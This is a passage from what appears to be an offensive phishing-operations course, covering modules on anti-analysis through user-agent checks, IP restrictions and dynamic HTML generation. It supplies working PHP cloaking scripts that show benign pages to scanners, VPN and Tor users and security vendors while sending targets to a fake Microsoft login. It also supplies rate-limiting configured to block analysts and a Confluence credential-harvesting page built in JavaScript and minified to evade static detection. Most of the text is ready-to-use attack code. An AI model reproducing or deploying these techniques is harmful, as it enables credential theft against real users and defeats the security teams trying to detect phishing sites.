        }
    } 
    
    // Safari check
    else if (userAgent.includes("version") && userAgent.includes("safari")) {
        browser = "safari";
        if (!CSS.supports('-webkit-line-grid', 'none')) {
            console.log("Spoofing detected for Safari.");
        }
    } 
    
    else {
        console.log("Browser could not be identified.");
    }
}

```
The video can be found in folder: `./videos/ua-detection-demo.mov`

## Conclusão
This module has showcased several common but unofficial techniques for detecting user agent spoofing. There are additional known and yet-to-be-discovered methods capable of identifying specific browsers or operating systems. Some techniques measure the execution time of particular APIs to deduce the underlying OS or browser. However as previously mentioned, these methods can change suddenly and without warning, making them unreliable.

## Leitura Complementar

- How Websites Know You're Lying About Your User-Agent

## Objetivos
Implement checks to determine if the user agent is being spoofed

Find another navigator property only available in Firefox

Research additional methods of detecting Safari

Research additional non-standard methods to specifically detect Chrome and Microsoft Edge


---

# Módulo 41 — Anti-Análise Via Restrições de IP

Módulo 41 — Anti-Analysis Via IP Restrictions

- # Módulo 41 — Anti-Análise Via Restrições de IP

# Disclaimer

## Introdução
In the previous module, we discussed user agent filtering to detect bots and show them benign content or redirect them away from our phishing website. As mentioned, the main issue with user agent filtering is the ease in which one can spoof their user agent. In this module, we discuss an improved anti-analysis technique which relies on analyzing the user's IP address and making a determination on what action should be taken.This module will use several online services for IP analysis and therefore accounts may be required for some services. Some of the well-known IP analysis APIs are listed below:
Ipinfo.io

- Scamalytics

- api.incolumitas.com

## Filtragem por Localização Geográfica
An objective during the reconnaissance phase should be to identify the regions where the target users are likely located. For example, if an organization has offices in New York City and Berlin, it's reasonable to assume that the users are primarily based in the United States and Germany. Therefore, one strategy would be to filter out IP addresses that do not originate from these countries.

Filtering IP addresses based on geographic locations comes with several limitations. Target users may sometimes be located outside the expected regions for various reasons, such as being on vacation. Additionally, permitted countries often include the organization's security team, meaning they would still have access to the website. Many automated scanners operate from infrastructure spread across different geographic locations, which could allow them to bypass these restrictions. Furthermore, a user's geographic location can easily be spoofed using VPNs or proxies, making this method less reliable for access control.

Therefore, while geographic location filtering can be an effective anti-bot and anti-analysis measure, it should be used alongside other detection techniques, as it is not sufficient on its own to block all bot traffic.

### Whitelisting Countries
As previously discussed, whitelisting the countries where our target users are located is often the most effective approach. One method involves blocking all IP addresses that do not originate from these target countries by configuring the Apache virtual host file as shown below:

```
<VirtualHost *:80>
    ServerName phishing-example.com
    DocumentRoot /var/www/html

    <Directory "/var/www/html">
        Require all granted               # Allow all IPs except those specified below
        Require not ip 192.168.1.100      # Block specific IP
        Require not ip 203.0.113.0/24     # Block IP range
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```
However, this approach comes with significant challenges. The sheer number of IP addresses makes manually adding them an extremely time-consuming task, especially when considering the need to do so for every phishing campaign. Additionally, IP addresses are frequently reassigned and change over time, meaning that by the time the blocking process is completed, the list may already be outdated.

A more effective strategy is to analyze each incoming IP address, determine its geographical location through an API call, and assess whether to block or allow the request. For this purpose, we will use Country.is, a free and simple API that provides the country associated with a given IP address.

```
<?php
// Whitelisted country codes
// Api.country.is returns the country code
$whitelistedCountries = ['US', 'DE'];

// Fetch the IP address of the user
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Query api.country.is get the country based on the IP address
$apiUrl = "https://api.country.is/" . $ipAddress;
$response = file_get_contents($apiUrl);
$locationData = json_decode($response, true);

if (isset($locationData['country'])) {
    $countryCode = $locationData['country'];

    // If the country is not whitelisted, shown benign content
    if (!in_array($countryCode, $whitelistedCountries)) {
        header('Location: /blocked.php');
        exit;
    } else {
        // If the country is whitelisted, show phishing content
        header('Location: /microsoft-login.php');
        exit;
    }
} else {
    // Fail safe, if the API fails default to showing benign content
    header('Location: /blocked.php');
    exit;
}
?>

```

### Whitelisting Regions & Cities
Instead of whitelisting entire countries, a more targeted approach is to whitelist specific regions or cities where users reside. However, as geographic filtering becomes more granular, the risk of inadvertently blocking legitimate users increases due to potential inaccuracies provided by the API. Therefore, it is often safer to whitelist countries or, at most, regions. If you opt to whitelist by city, it’s recommended to include nearby cities as well to avoid blocking users who might live or work just outside the main city. For example, if your target user is in New York City, you might also whitelist neighboring cities like Newark and Jersey City.

Whitelisting regions and cities require the usage of `IPInfo.io`'s API as it provides additional data that `api.country.is` does not provide. To whitelist the regions of New York and Berlin, use the PHP script below.

```
<?php
// IPInfo API token
$apiToken = '123456789';

// Whitelisted regions
$whitelistedRegions = ['New York', 'Berlin'];

// IP address
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Query ipinfo.io's API
$apiUrl = "https://ipinfo.io/{$ipAddress}?token={$apiToken}";
$response = file_get_contents($apiUrl);
$locationData = json_decode($response, true);

if (isset($locationData['region'])) {
    $region = $locationData['region'];

    // If the region is not whitelisted, show benign content
    if (!in_array($region, $whitelistedRegions)) {
        header('Location: /blocked.php');
        exit;
    } else {
        // If the region is whitelisted, show phishing content
        header('Location: /microsoft-login.php');
        exit;
    }
} else {
    // Fail safe, if the API fails, default to showing benign content
    header('Location: /blocked.php');
    exit;
}
?>

```

## Bloqueio Geográfico via Cloudflare
Cloudflare provides an option to restrict access based on geographic location. If your website is integrated with Cloudflare, you can create a custom rule by navigating to "Security" > "WAF" > "Custom Rules." For guidance on setting up Cloudflare for your phishing website, refer to the Securing Server Via Cloudflare module.

To enforce country-based restrictions, configure the rules to allow access only from specific countries. The example shown below blocks all requests unless they originate from an IP address in the United States or Germany.

## Filtragem de IPs Anonimizados
IP addresses provide more than just geographical information; they can also indicate whether an anonymizing service, such as a VPN or hosting provider, is being used. By leveraging IPInfo's API, we can detect these services and take appropriate action.

NOTE: Retrieving the privacy object from an IP address requires a paid subscription on IPInfo.

Scanners and security defenders often operate from cloud platforms like AWS or Azure. If they attempt to access our phishing site, we can identify the use of such hosting services via the API and block access or display benign content.

The PHP script below checks if any of the privacy indicators (i.e `hosting`, `proxy`, `tor`, `relay`, `vpn`) are enabled and if so, displays the message "Anonymized IP address detected. Access Denied".

```
<?php
// IPInfo API token
$apiToken = '123456789';

// Toggle these flags to enable/disable checks
$checkHosting = true;
$checkProxy = true;
$checkTor = true;
$checkRelay = true;
$checkVPN = true;

// IP address
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Query ipinfo.io's API
$apiUrl = "https://ipinfo.io/{$ipAddress}?token={$apiToken}";
$response = file_get_contents($apiUrl);
$locationData = json_decode($response, true);

if (isset($locationData['privacy'])) {
    $privacyData = $locationData['privacy'];

    // Check each flag based on toggles
    if (($checkHosting && $privacyData['hosting']) ||
        ($checkProxy && $privacyData['proxy']) ||
        ($checkTor && $privacyData['tor']) ||
        ($checkRelay && $privacyData['relay']) ||
        ($checkVPN && $privacyData['vpn'])) {
        
        echo "Anonymized IP address detected. Access Denied.\n";
        // Commented out for this example
        // header('Location: /blocked.php');
        exit;
    } else {
        // Show phishing content
        header('Location: /microsoft-login.php');
        exit;
    }
} else {
    // Fail safe, if the API fails, default to showing benign content
    header('Location: /blocked.php');
    exit;
}
?>

```
Use GeoPeeker to confirm that the PHP script is functioning correctly. GeoPeeker attempts to access your website from multiple regions, likely using machines hosted by cloud providers and provides a screenshot of the site.

As anticipated, the service is blocked from accessing the website, and the access denied message is displayed.

## VPN Service Provider Analysis
Legitimate users may be connecting to our phishing website through their organization's VPN. To avoid blocking these users, you might want to refine the check on the VPN indicator to distinguish between widely used VPN services like NordVPN or Mullvad and corporate VPNs, which can be verified via the `service` value in the API response.

```
<?php
// IPInfo API token
$apiToken = '123456789';

// Blacklisted VPN providers
$blockedVPNServices = ['NordVPN', 'Mullvad'];

// IP address
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Query ipinfo.io's API
$apiUrl = "https://ipinfo.io/{$ipAddress}?token={$apiToken}";
$response = file_get_contents($apiUrl);
$locationData = json_decode($response, true);

if (isset($locationData['privacy'])) {
    $privacyData = $locationData['privacy'];

    // Check if VPN is true and the service value is in the blacklisted VPN providers list
    if ($privacyData['vpn'] && in_array($privacyData['service'], $blockedVPNServices)) {
        echo "Please disable your VPN\n";
        header('Location: /blocked.php');
        exit;
    } else {
        // Show phishing content
        header('Location: /microsoft-login.php');
        exit;
    }
} else {
    // Fail safe, if the API fails, default to showing benign content
    header('Location: /blocked.php');
    exit;
}
?>

```

## IPInfo.io Alternative API
Throughout this module, we've mainly relied on IPInfo.io as it provides one of the best sources of IP data and an easy-to-use API. For those interested in a different API, we will show an example that uses Scamalytics which provides IP analysis data. Scamalytics requires an API key which can be obtained for free by submitting this form.

Once the API key has been received, you can make an API call using the command below:

```
# <username> is your account username
# <key> is your API key
# <ip> is the IP to lookup
curl 'https://api11.scamalytics.com/<username>/?key=<key>&ip=<ip>'

```
The output is not beautified in the same manner as IPInfo.io, therefore we'll need to install and use `jq`, a command-line tool that can process JSON.

```
# Install jq
sudo apt install jq

# Make the API call and pipe the output to jq
curl 'https://api11.scamalytics.com/<username>/?key=<key>&ip=<ip>' | jq

```

As demonstrated in the image above, the API provides IP information as well as fraud details, though our current focus is not on the fraud aspect. While we can create PHP scripts similar to those discussed earlier in this module, for this example, we will develop a new PHP script that checks the `proxy_type` field. If the field is not set to `0`, the script will block access. This will essentially block any IP address that's using VPN, hosting service, TOR, proxies etc. which is similar to what was done with IPInfo.io.

```
<?php
// Username & API key
$apiUsername = 'username';
$apiKey = '123456789';

// IP address
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Query Scamalytics API
$apiUrl = "https://api11.scamalytics.com/{$apiUsername}/?key={$apiKey}&ip={$ipAddress}";
$response = file_get_contents($apiUrl);
$data = json_decode($response, true);

if (isset($data['proxy_type'])) {
    
    // Extract and verify proxy_type
    $proxyType = $data['proxy_type'];
    if ($proxyType !== '0') {
        header('Location: /blocked.php');
        exit;
    } else {
        header('Location: /microsoft-login.php');
        exit;
    }
} else {
    // Fail safe, if the API fails, default to showing benign content
    header('Location: /blocked.php');
    exit;
}
?>

```

## Rate Limiting
When the phishing website is being analyzed manually or by automated scanners, there may be an unusual surge in HTTP requests made on the website. To combat this, we can implement IP address rate limiting using `mod_evasive`, an Apache module.

Start by installing `mod_evasive` using the command below.

```
sudo apt install libapache2-mod-evasive

```
Once installed, open the configuration file in a text editor:

```
nano /etc/apache2/mods-available/evasive.conf

```
The configuration file is commented out because it is disabled by default. We will need to enable some of the configuration options by removing the `#` symbol.

```
<IfModule mod_evasive20.c>
    DOSHashTableSize    3097 # Uncomment
    DOSPageCount        2    # Uncomment
    DOSSiteCount        50   # Uncomment
    DOSPageInterval     1    # Uncomment
    DOSSiteInterval     1    # Uncomment
    DOSBlockingPeriod   10   # Uncomment

    #DOSEmailNotify      you@yourdomain.com
    #DOSSystemCommand    "su - someuser -c '/sbin/... %s ...'"
    #DOSLogDir           "/var/log/mod_evasive"
</IfModule>

```
The configuration options are explained below:

- `DOSHashTableSize` - The size of the hash table for tracking. Increasing this number will provide faster performance but consume more memory. We can keep this to the default value as phishing websites generally do not receive high traffic.

- `DOSPageCount` - The threshold for the number of requests allowed for the same page per `DOSPageInterval`.

- `DOSSiteCount` - The threshold for the total number of requests allowed for any page on the website per `DOSSiteInterval`.

- `DOSPageInterval` - The interval for the page count threshold.

- `DOSSiteInterval` - The interval for the site count threshold.

- `DOSBlockingPeriod` - The time that a client will be blocked for. During this time, any requests from the client will result in an HTTP 403.

### Sample Mod_Evasive Configuration
The configuration provided below will perform the following:

- If the user accesses the same page 5 times in 1 second

- Or performs 20 requests to any page in 5 seconds

- Then, they will blocked for 3600 seconds (1 hour).

```
<IfModule mod_evasive20.c>
    DOSHashTableSize    3097
    DOSPageCount        5 
    DOSSiteCount        20
    DOSPageInterval     1
    DOSSiteInterval     5
    DOSBlockingPeriod   3600

    #DOSEmailNotify      you@yourdomain.com
    #DOSSystemCommand    "su - someuser -c '/sbin/... %s ...'"
    #DOSLogDir           "/var/log/mod_evasive"
</IfModule>

```
Restart Apache to apply the new rate-limiting configuration.

```
systemctl restart apache2

```
To test out the rate limiting configuration, we'll hold `Ctrl + R` to continuously reload the page at a quick rate. Notice the change in server response from 404 - Not Found to 403 - Forbidden, indicating our IP address is blocked.

The video can be found in folder: `./videos/rate-limiting.mov`

## Security Vendor IP Addresses
It's worth mentioning that there are already compiled lists available, such as AV-EDR-URLs, which include IP addresses associated with security vendors. It's advisable to blacklist these IP addresses, and you may also want to consider blocking the ASNs that these vendors use.

## Conclusão
This module highlighted the valuable insights an IP address can offer, helping us differentiate between legitimate users and automated scanners or tools attempting to access our website. Our objective is to block as many unwanted IP addresses as possible from accessing the phishing site or viewing the phishing content while minimizing the impact on the target users. Finding the right balance between being overly restrictive with IP blocking and allowing necessary access is essential to ensure the effectiveness of our campaign.

## Objetivos
Block traffic from the United States and scan your website using online scanners. Does this restriction significantly impact scanner detection?

Allow only traffic from the United States and scan your website using online scanners. Does this restriction significantly impact scanner detection?

Develop a PHP script to allow access based on time zones in specific regions

Create a PHP script to log IP addresses accessing your website and retrieve metadata from IPInfo.io or similar services

Analyze the logged IP addresses from the previous objective to identify patterns that could help in blocking bots


---

# Módulo 42 — Anti-Análise Via Geração Dinâmica de HTML

Módulo 42 — Anti-Analysis Via Dynamic HTML Generation

# Disclaimer

## Introdução
Historically, phishing websites primarily relied on HTML for their core functionality and used CSS for basic styling. However, modern phishing sites have increasingly incorporated JavaScript, which provides them with more sophisticated ways to evade both automated and manual analysis. One such technique is dynamic code generation, where key parts of the website's content, such as forms or buttons, are generated at runtime using JavaScript. This method makes use of the `createElement` JavaScript function to dynamically create HTML elements upon an action occurring.

This approach is particularly effective because it can bypass static analysis tools that scan for common HTML elements like `<form>`. Since elements are only created when JavaScript is executed, they remain hidden from tools that do not process or execute JavaScript, making detection more difficult. Keep in mind that some analysis tools are simplistic and do not have the capabilities to process JavaScript.

For example, a basic analysis tool might use `curl` to retrieve the website's content and then search for a `<form>` element in the results. If our `<form>` is dynamically generated using JavaScript, this tool would fail to detect it, as the element is only created at runtime and wouldn't be present in the static HTML fetched by `curl`.

This module will demonstrate how to dynamically generate code and analyze the differences between statically and dynamically generated content.

## Criando Elementos Dinamicamente
As previously mentioned, creating elements using JavaScript is done using the createElement method. For example, the code below creates a `<div>` element:

```
var newDiv = document.createElement('div');

```
Although the element has been created, it has not yet been added to the Document Object Model (DOM). The Document Object Model (DOM) is a hierarchical representation of a webpage, where HTML elements are structured as nodes that can be accessed and manipulated using JavaScript. An element exists in memory when created with `document.createElement()`, but it must be added to the DOM using methods like `appendChild()` or `insertBefore()` to appear on the page.

In the example below, we add text to the previously created element via innerHTML and append it to the body of the document using appendChild.

```
newDiv.innerHTML = 'This is a newly created div';
document.body.appendChild(newDiv);

```

We can inspect the DOM by accessing the "Inspector" tab in the developer tools, which will show that our element has now been added to the DOM, specifically, it's a child of the `<body>` element.

### Appending Elements To Each Other
Instead of appending an element directly to the `<body>` element, we can append elements to each other to create a nested structure. This allows us to build more complex layouts and group related elements together before adding them to the DOM.

For example, the code below creates a `<div>` and a `<p>` element using `createElement`, sets text inside the `<p>` element using textContent, and appends it into the `<div>` using `appendChild`. Lastly, the `<div>` element is appended to an existing element with the ID "sample-div" using `appendChild`.

```
// Create two elements
var newDiv = document.createElement('div');
var newParagraph = document.createElement('p');

// Add text to <p>
newParagraph.textContent = 'Maldev Academy';

// Append the paragraph to the div
newDiv.appendChild(newParagraph);

// Append newDiv to an element that has the ID 'sample-div'
// Assumes that `sample-div` already exists
document.getElementById('sample-div').appendChild(newDiv);

```

### Adding Attributes To Elements
We can add attributes to our newly created elements using `setAttribute(name, value)` or direct property assignments like `element.id` and `element.className`. As for inline styling, we can use `element.style.property`, where `property` is any valid CSS property written in camelCase (e.g., `backgroundColor`, `fontSize`, `marginTop`).

```
var newDiv = document.createElement('div');
newDiv.id = 'sample-div'; // Set the ID attribute for newDiv
newDiv.className = 'container'; // Set a class name

// Apply inline styles
newDiv.style.backgroundColor = 'blue';

// Append the styled div to the body or another element
document.body.appendChild(newDiv);

```

## Gerando Página Phishing Dinamicamente
To understand the effectiveness of dynamic code generation, we will use a static phishing page and re-create the same page using JavaScript's dynamic element creation. Once both pages have been created, we will analyze them visually and statically to determine how they differ. For this example, we will use the Confluence phishing page that was used in the Integrating Backend Functionality module, shown below.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confluence Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            border: 1px solid #dfe1e6;
            border-radius: 5px;
            padding: 30px;
            width: 300px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .login-container h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #0052cc;
        }
        .login-container label {
            display: block;
            margin-bottom: 5px;
            text-align: left;
        }
        .login-container input[type="text"],
        .login-container input[type="password"],
        .login-container button {
            width: 100%;
            max-width: 300px;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dfe1e6;
            border-radius: 3px;
            box-sizing: border-box;
        }
        .login-container button {
            background-color: #0052cc;
            color: #ffffff;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        .login-container button:hover {
            background-color: #0747a6;
        }
        .login-container .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }
        .login-container .forgot-password a {
            color: #0052cc;
            text-decoration: none;
        }
        .login-container .forgot-password a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Log in to Confluence</h1>
        <form action="submit.php" method="POST">
            <div>
                <label for="username">Username or email</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div>
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div>
                <button type="submit">Log In</button>
            </div>
        </form>
        <div class="forgot-password">
            <a href="#">Can't log in?</a>
        </div>
    </div>
</body>
</html>

```
The previous phishing page will be re-created to dynamically generate HTML elements using JavaScript when the page loads. This is achieved using various functions discussed earlier, such as `createElement()` for creating elements, `appendChild()` for adding them to the DOM, `setAttribute()` and direct property assignment for setting attributes, `textContent` for adding text to an element, and `element.style.property` for applying inline CSS styles.

The first part shown below creates a `<div>` container with a class, followed by a heading element displaying "Log in to Confluence". A `<form>` is then generated with its action set to `submit.php` and the method set to `POST` to handle user input.

```
var container = document.createElement("div");
container.className = "login-container";

var heading = document.createElement("h1");
heading.textContent = "Log in to Confluence";
container.appendChild(heading);

var elem = document.createElement("form");
elem.action = "submit.php";
elem.method = "POST";

```
Next, the script dynamically creates form input elements. A `<div>` is added for the username field, containing a label and an input field. Similarly, another `<div>` is created for the password field with its respective label and input. A submit button is then generated and placed inside a separate `<div>`. Finally, all these elements are appended to the form and then to the container.

```
// Username stuff
var usernameDiv = document.createElement("div");
var usernameLabel = document.createElement("label");
usernameLabel.htmlFor = "username";
usernameLabel.textContent = "Username or email";
var usernameInput = document.createElement("input");
usernameInput.type = "text";
usernameInput.id = "username";
usernameInput.name = "username";
usernameInput.required = true;
usernameDiv.appendChild(usernameLabel);
usernameDiv.appendChild(usernameInput);
elem.appendChild(usernameDiv);

// Password stuff
var passwordDiv = document.createElement("div");
var passwordLabel = document.createElement("label");
passwordLabel.htmlFor = "password";
passwordLabel.textContent = "Password";
var passwordInput = document.createElement("input");
passwordInput.type = "password";
passwordInput.id = "password";
passwordInput.name = "password";
passwordInput.required = true;
passwordDiv.appendChild(passwordLabel);
passwordDiv.appendChild(passwordInput);
elem.appendChild(passwordDiv);

// Button
var buttonDiv = document.createElement("div");
var submitButton = document.createElement("button");
submitButton.type = "submit";
submitButton.textContent = "Log In";
buttonDiv.appendChild(submitButton);
elem.appendChild(buttonDiv);

// Append it all to to the container
container.appendChild(elem);

```
Finally, the script adds a "Forgot Password" link inside a `<div>` and appends it to the container. The entire container is then appended to the document body. Additionally, a `<style>` element is created and injected into the document's `<head>`, applying CSS to style the login form, input fields, and buttons.

```
var forgotPasswordDiv = document.createElement("div");
forgotPasswordDiv.className = "forgot-password";
var forgotPasswordLink = document.createElement("a");
forgotPasswordLink.href = "#";
forgotPasswordLink.textContent = "Can't log in?";
forgotPasswordDiv.appendChild(forgotPasswordLink);
container.appendChild(forgotPasswordDiv);

// Append the container to the body
document.body.appendChild(container);

// CSS styling
var style = document.createElement("style");
style.textContent = `
    body {
        font-family: Arial, sans-serif;
        background-color: #f4f5f7;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }
    .login-container {
        background-color: #ffffff;
        border: 1px solid #dfe1e6;
        border-radius: 5px;
        padding: 30px;
        width: 300px;
        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        text-align: center;
    }
    .login-container h1 {
        font-size: 24px;
        margin-bottom: 20px;
        color: #0052cc;
    }
    .login-container label {
        display: block;
        margin-bottom: 5px;
        text-align: left;
    }
    .login-container input[type="text"],
    .login-container input[type="password"],
    .login-container button {
        width: 100%;
        max-width: 300px;
        padding: 10px;
        margin-bottom: 10px;
        border: 1px solid #dfe1e6;
        border-radius: 3px;
        box-sizing: border-box;
    }
    .login-container button {
        background-color: #0052cc;
        color: #ffffff;
        border: none;
        cursor: pointer;
        font-size: 16px;
    }
    .login-container button:hover {
        background-color: #0747a6;
    }
    .login-container .forgot-password {
        margin-top: 10px;
        font-size: 14px;
    }
    .login-container .forgot-password a {
        color: #0052cc;
        text-decoration: none;
    }
    .login-container .forgot-password a:hover {
        text-decoration: underline;
    }
`;
document.head.appendChild(style);

```
The entirety of the JavaScript code is placed within a DOMContentLoaded event listener, ensuring that the script executes only after the HTML document has fully loaded. This prevents errors that could arise from attempting to manipulate elements before they exist in the DOM.

```
document.addEventListener("DOMContentLoaded", function() {
    // Add the JS here
    // ...
    // ...
});

```
The updated Confluence phishing page, dynamically generated with JavaScript, is displayed below.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confluence Login</title>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var container = document.createElement("div");
            container.className = "login-container";

            var heading = document.createElement("h1");
            heading.textContent = "Log in to Confluence";
            container.appendChild(heading);

            var elem = document.createElement("form");
            elem.action = "submit.php";
            elem.method = "POST";

            var usernameDiv = document.createElement("div");
            var usernameLabel = document.createElement("label");
            usernameLabel.htmlFor = "username";
            usernameLabel.textContent = "Username or email";
            var usernameInput = document.createElement("input");
            usernameInput.type = "text";
            usernameInput.id = "username";
            usernameInput.name = "username";
            usernameInput.required = true;
            usernameDiv.appendChild(usernameLabel);
            usernameDiv.appendChild(usernameInput);
            elem.appendChild(usernameDiv);

            var passwordDiv = document.createElement("div");
            var passwordLabel = document.createElement("label");
            passwordLabel.htmlFor = "password";
            passwordLabel.textContent = "Password";
            var passwordInput = document.createElement("input");
            passwordInput.type = "password";
            passwordInput.id = "password";
            passwordInput.name = "password";
            passwordInput.required = true;
            passwordDiv.appendChild(passwordLabel);
            passwordDiv.appendChild(passwordInput);
            elem.appendChild(passwordDiv);

            var buttonDiv = document.createElement("div");
            var submitButton = document.createElement("button");
            submitButton.type = "submit";
            submitButton.textContent = "Log In";
            buttonDiv.appendChild(submitButton);
            elem.appendChild(buttonDiv);

            container.appendChild(elem);

            var forgotPasswordDiv = document.createElement("div");
            forgotPasswordDiv.className = "forgot-password";
            var forgotPasswordLink = document.createElement("a");
            forgotPasswordLink.href = "#";
            forgotPasswordLink.textContent = "Can't log in?";
            forgotPasswordDiv.appendChild(forgotPasswordLink);
            container.appendChild(forgotPasswordDiv);

            // Append the container to the body
            document.body.appendChild(container);

            // CSS styling
            var style = document.createElement("style");
            style.textContent = `
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f4f5f7;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .login-container {
                    background-color: #ffffff;
                    border: 1px solid #dfe1e6;
                    border-radius: 5px;
                    padding: 30px;
                    width: 300px;
                    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
                    text-align: center;
                }
                .login-container h1 {
                    font-size: 24px;
                    margin-bottom: 20px;
                    color: #0052cc;
                }
                .login-container label {
                    display: block;
                    margin-bottom: 5px;
                    text-align: left;
                }
                .login-container input[type="text"],
                .login-container input[type="password"],
                .login-container button {
                    width: 100%;
                    max-width: 300px;
                    padding: 10px;
                    margin-bottom: 10px;
                    border: 1px solid #dfe1e6;
                    border-radius: 3px;
                    box-sizing: border-box;
                }
                .login-container button {
                    background-color: #0052cc;
                    color: #ffffff;
                    border: none;
                    cursor: pointer;
                    font-size: 16px;
                }
                .login-container button:hover {
                    background-color: #0747a6;
                }
                .login-container .forgot-password {
                    margin-top: 10px;
                    font-size: 14px;
                }
                .login-container .forgot-password a {
                    color: #0052cc;
                    text-decoration: none;
                }
                .login-container .forgot-password a:hover {
                    text-decoration: underline;
                }
            `;
            document.head.appendChild(style);
        });
    </script>
</head>
<body>
</body>
</html>

```
To the human eye, both pages will appear identical, however to defenders and scanners the pages appear different when the underlying code is analyzed.

Open the web browser and access both the static and dynamic pages, right-click and select "View Page Source" to see the different frontend HTML, CSS, and JavaScript code.

## JavaScript Minification
Using JavaScript, we can make the code less readable by minifying it through online services such as the DigitalOcean Minify Tool. However, it's important to note that minification is not a true obfuscation method. Minification reduces file size by removing unnecessary characters like spaces and line breaks, but it does not obscure the underlying logic of the code. Additionally, minified code can be easily "beautified" or reformatted using various online and offline tools, making it easy to reverse the process and restore readability.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confluence Login</title>
    <script>
    document.addEventListener("DOMContentLoaded",(function(){var n=document.createElement("div");n.className="login-container";var e=document.createElement("h1");e.textContent="Log in to Confluence",n.appendChild(e);var t=document.createElement("form");t.action="submit.php",t.method="POST";var o=document.createElement("div"),a=document.createElement("label");a.htmlFor="username",a.textContent="Username or email";var r=document.createElement("input");r.type="text",r.id="username",r.name="username",r.required=!0,o.appendChild(a),o.appendChild(r),t.appendChild(o);var d=document.createElement("div"),i=document.createElement("label");i.htmlFor="password",i.textContent="Password";var l=document.createElement("input");l.type="password",l.id="password",l.name="password",l.required=!0,d.appendChild(i),d.appendChild(l),t.appendChild(d);var c=document.createElement("div"),p=document.createElement("button");p.type="submit",p.textContent="Log In",c.appendChild(p),t.appendChild(c),n.appendChild(t);var m=document.createElement("div");m.className="forgot-password";var s=document.createElement("a");s.href="#",s.textContent="Can't log in?",m.appendChild(s),n.appendChild(m),document.body.appendChild(n);var u=document.createElement("style");u.textContent='\n body {\n font-family: Arial, sans-serif;\n background-color: #f4f5f7;\n display: flex;\n justify-content: center;\n align-items: center;\n height: 100vh;\n margin: 0;\n }\n .login-container {\n background-color: #ffffff;\n border: 1px solid #dfe1e6;\n border-radius: 5px;\n padding: 30px;\n width: 300px;\n box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);\n text-align: center;\n }\n .login-container h1 {\n font-size: 24px;\n margin-bottom: 20px;\n color: #0052cc;\n }\n .login-container label {\n display: block;\n margin-bottom: 5px;\n text-align: left;\n }\n .login-container input[type="text"],\n .login-container input[type="password"],\n .login-container button {\n width: 100%;\n max-width: 300px;\n padding: 10px;\n margin-bottom: 10px;\n border: 1px solid #dfe1e6;\n border-radius: 3px;\n box-sizing: border-box;\n }\n .login-container button {\n background-color: #0052cc;\n color: #ffffff;\n border: none;\n cursor: pointer;\n font-size: 16px;\n }\n .login-container button:hover {\n background-color: #0747a6;\n }\n .login-container .forgot-password {\n margin-top: 10px;\n font-size: 14px;\n }\n .login-container .forgot-password a {\n color: #0052cc;\n text-decoration: none;\n }\n .login-container .forgot-password a:hover {\n text-decoration: underline;\n }\n ',document.head.appendChild(u)}));
    </script>
</head>
<body>
</body>
</html>

```

### Inspecting Element
Right-clicking a web page and selecting the "Inspect Element" option opens the browser's Dev Tools, offering a more detailed view of the code. The "Elements" or "Inspector" tab displays the DOM as it appears after JavaScript has been executed, allowing defenders to view all dynamically generated elements within the code. The Dev Tools also show which element has a JavaScript event tied to it, as in the image below, our `<html>` element has an event because we've used `DOMContentLoaded` on the `document` to trigger certain actions once the page's DOM is fully loaded. Clicking on the event icon near the element displays the JavaScript associated with that event.

The left side of the image below shows a static page without any events attached to the `<html>` node. In contrast, the dynamically generated page on the right includes an attached event.

Rather than attaching an event like `DOMContentLoaded`, the JavaScript code can be encapsulated within a custom function that is then executed directly. However, since the script may run before the DOM is fully loaded, it's important to ensure that the `<body>` element is already available in the DOM when the function executes. The updated code below removes the `DOMContentLoaded` event, and adds the dynamic page generation functionality to the `run` function, then invokes it.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confluence Login</title>
    <body></body> <!-- We need to add this now -->
    <script>
        function run(){
        var container = document.createElement("div");
        container.className = "login-container";

        var heading = document.createElement("h1");
        heading.textContent = "Log in to Confluence";
        container.appendChild(heading);

        var elem = document.createElement("form");
        elem.action = "submit.php";
        elem.method = "POST";

        var usernameDiv = document.createElement("div");
        var usernameLabel = document.createElement("label");
        usernameLabel.htmlFor = "username";
        usernameLabel.textContent = "Username or email";
        var usernameInput = document.createElement("input");
        usernameInput.type = "text";
        usernameInput.id = "username";
        usernameInput.name = "username";
        usernameInput.required = true;
        usernameDiv.appendChild(usernameLabel);
        usernameDiv.appendChild(usernameInput);
        elem.appendChild(usernameDiv);

        var passwordDiv = document.createElement("div");
        var passwordLabel = document.createElement("label");
        passwordLabel.htmlFor = "password";
        passwordLabel.textContent = "Password";
